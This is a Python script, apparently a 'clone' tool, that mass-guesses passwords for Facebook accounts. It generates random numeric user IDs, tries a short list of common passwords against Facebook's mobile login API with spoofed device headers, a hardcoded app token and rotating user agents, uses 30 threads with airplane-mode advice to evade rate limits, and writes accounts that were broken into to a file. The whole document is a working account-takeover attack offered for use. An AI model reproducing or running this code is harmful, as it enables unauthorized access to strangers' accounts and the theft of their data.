import os
import datetime
import bs4,json,sys,time,random,re,subprocess,platform,struct,string,uuid,base64,zlib,certifi,ssl,_socket,requests
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
ses=requests.Session()
loop,oks,cps,user,ugen=0,[],[],[],[]
G="\x1b[38;5;46m";W="\x1b[38;5;15m";B="\x1b[38;5;8m";Y="\x1b[38;5;226m";A="\x1b[38;5;123m";R="\x1b[38;5;160m";O="\x1b[38;5;81m";X="\x1b[38;5;205m";P="\033[0;34m"
logo=f"""
{G}┏┓┏┳┓
┗┓ ┃ 
┗┛ ┻{A} OLD CLONE"""
def clear():os.system('clear');print(logo)
def linex():print(f"{G}____________________________________________")

for xr in range(10000):
    rr=random.randint
    xv=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    xy=random.randrange(400,700)
    realme = random.choice(["RMX3516", "RMX3371", "RMX3461", "RMX3286", "RMX3561", "RMX3388", "RMX3311", "RMX3142", "RMX2071", "RMX1805", "RMX1809", "RMX1801", "RMX1807", "RMX1803", "RMX1825", "RMX1821", "RMX1822", "RMX1833", "RMX1851", "RMX1853", "RMX1827", "RMX1911", "RMX1919", "RMX1927", "RMX1971", "RMX1973", "RMX2030", "RMX2032", "RMX1925", "RMX1929", "RMX2001", "RMX2061", "RMX2063", "RMX2040", "RMX2042", "RMX2002", "RMX2151", "RMX2163", "RMX2155", "RMX2170", "RMX2103", "RMX3085", "RMX3241", "RMX3081", "RMX3151", "RMX3381", "RMX3521", "RMX3474", "RMX3471", "RMX3472", "RMX3392", "RMX3393", "RMX3491", "RMX1811", "RMX2185", "RMX3231", "RMX2189", "RMX2180", "RMX2195", "RMX2101", "RMX1941", "RMX1945", "RMX3063", "RMX3061", "RMX3201", "RMX3203", "RMX3261", "RMX3263", "RMX3193", "RMX3191", "RMX3195", "RMX3197", "RMX3265", "RMX3268", "RMX3269", "RMX2027", "RMX2020", "RMX2021", "RMX3581", "RMX3501", "RMX3503", "RMX3511", "RMX3310", "RMX3312", "RMX3551", "RMX3301", "RMX3300", "RMX2202", "RMX3363", "RMX3360", "RMX3366", "RMX3361", "RMX3031", "RMX3370", "RMX3357", "RMX3560", "RMX3562", "RMX3350", "RMX2193", "RMX2161", "RMX2050", "RMX2156", "RMX3242", "RMX3171", "RMX3430", "RMX3235", "RMX3506", "RMX2117", "RMX2173", "RMX3161", "RMX2205", "RMX3462", "RMX3478", "RMX3372", "RMX3574", "RMX1831", "RMX3121", "RMX3122", "RMX3125", "RMX3043", "RMX3042", "RMX3041", "RMX3092", "RMX3093", "RMX3571", "RMX3475", "RMX2200", "RMX2201", "RMX2111", "RMX2112", "RMX1901", "RMX1903", "RMX1992", "RMX1993", "RMX1991", "RMX1931", "RMX2142", "RMX2081", "RMX2085", "RMX2083", "RMX2086", "RMX2144", "RMX2051", "RMX2025", "RMX2075", "RMX2076", "RMX2072", "RMX2052", "RMX2176", "RMX2121", "RMX3115", "RMX1921"])
    xd=f"Mozilla/5.0 (Linux; Android {str(rr(0,20))}; {realme}) Build/0{str(rr(1,9))}0{str(rr(1,20))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(50,99))}.0.{str(rr(4000,9000))}.{str(rr(72,140))} Mobile Safari/537.36"
    xd=f"Mozilla/5.0 (Linux; Android {str(rr(0,20))}; X{xy}{xv}) Build/0{str(rr(1,9))}0{str(rr(1,20))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(50,99))}.0.{str(rr(4000,9000))}.{str(rr(72,140))} Mobile Safari/537.36"
    ugen.append(xd)
    
def main():
	clear();animation = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
	for i in range(30):time.sleep(0.1);sys.stdout.write(f"\r{G}[{A}ᯤ{G}]{A} LOADING...\033[97;1m " + animation[i % len(animation)] +"\x1b[0m ");sys.stdout.flush();clear()
	print(f"{G}[{A}01{G}] {A}Crack 2009\n{G}[{A}02{G}] {A}Crack 2010\n{G}[{A}03{G}] {A}Crack 2011-2015")
	linex()
	ch = input(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mSELECTION \33[38;5;160m▶ \033[1;97m')
	if ch in ["1","01"]:mok()
	elif ch in ["2","02"]:mok()
	if ch in ["3","03"]:mok()
	else:mok()

def mok():
	clear()
	print(f"{G}[{A}={G}] {A}Limit Contoh => {G}3000 {A}|{G} 5000 {A}| {G}9999")
	limit = input(f'{G}[{A}={G}] {A}Limit => {G}');linex()
	ids="1000000"
	for i in range(int(limit)):
		data=str(random.choice(range(10000000,19999999)));user.append(data)
	with tred(max_workers=30) as jihad:
		clear();print(f'\33[38;5;160m[\033[1;97m\33[38;5;160m] \033[1;97mTOTAL ID \33[38;5;160m▶ \033[1;97m{limit}');print(f'\33[38;5;160m[\033[1;97m\33[38;5;160m] \033[1;97mUSED AIRPLANE MODE AFTER 5 MINUTE ');linex()
		for mal in user:
			uid=ids+mal
			jihad.submit(running,uid)

def running(uid):
    global oks,loop,cps
    Session=requests.session()
    try:
        sys.stdout.write(f'\r\r\33[38;5;37m[\x1b[38;5;46mST OLD\33[38;5;37m-\x1b[38;5;46mB1\33[38;5;37m]\033[1;97m-\33[38;5;37m[\033[1;97m{loop}\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46mOK\33[38;5;160m/\x1b[38;5;208mCP\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46m{len(oks)}\33[38;5;160m/\x1b[38;5;208m{len(cps)}\33[38;5;37m]')
        sys.stdout.flush()
        ua = random.choice(ugen)
        for pw in ["123456","1234567","12345678","123456789","111222"]:
            data = {'adid':str(uuid.uuid4()),
            'format': 'json',
            'device_id':str(uuid.uuid4()),
            'cpl': 'true',
            'family_device_id':str(uuid.uuid4()),
            'credentials_type': 'device_based_login_password', 
            'error_detail_type': 'button_with_disabled', 
            'source': 'device_based_login', 
            'email':str(uid),
            'password':str(pw),
            'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32', 
            'generate_session_cookies': '1', 
            'meta_inf_fbmeta': '', 
            'advertiser_id':str(uuid.uuid4()),
            'currently_logged_in_userid': '0', 
            'locale': 'en_US',
            'client_country_code': 'US', 
            'method': 'auth.login', 
            'fb_api_req_friendly_name': 'authenticate', 
            'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler', 
            'api_key': '882a8490361da98702bf97a021ddc14d'}
            head = {'User-Agent': ua,
            'Content-Type': 'application/x-www-form-urlencoded', 
            'Host': 'graph.facebook.com', 
            'X-FB-Net-HNI': str(random.randint(20000, 40000)),
            'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
            'X-FB-Connection-Type': 'MOBILE.LTE', 
            'X-Tigon-Is-Retry': 'False', 
            'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62', 
            'x-fb-device-group': '5120', 
            'X-FB-Friendly-Name': 'ViewerReactionsMutation', 
            'X-FB-Request-Analytics-Tags': 'graphservice', 
            'X-FB-HTTP-Engine': 'Liger', 
            'X-FB-Client-IP': 'True', 
            'X-FB-Server-Cluster': 'True', 
            'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62', 
            'Content-Length': '706'}
            url = "https://b-graph.facebook.com/auth/login"
            rp = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
            if "session_key" in rp:            	
                cps.append(uid)
                break
            elif "Please Confirm Email" in str(rp):
                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mST OLD\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m')
                open("/sdcard/ST OLD-M1-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
            else:continue
        loop+=1
    except Exception as e:time.sleep(30)

main()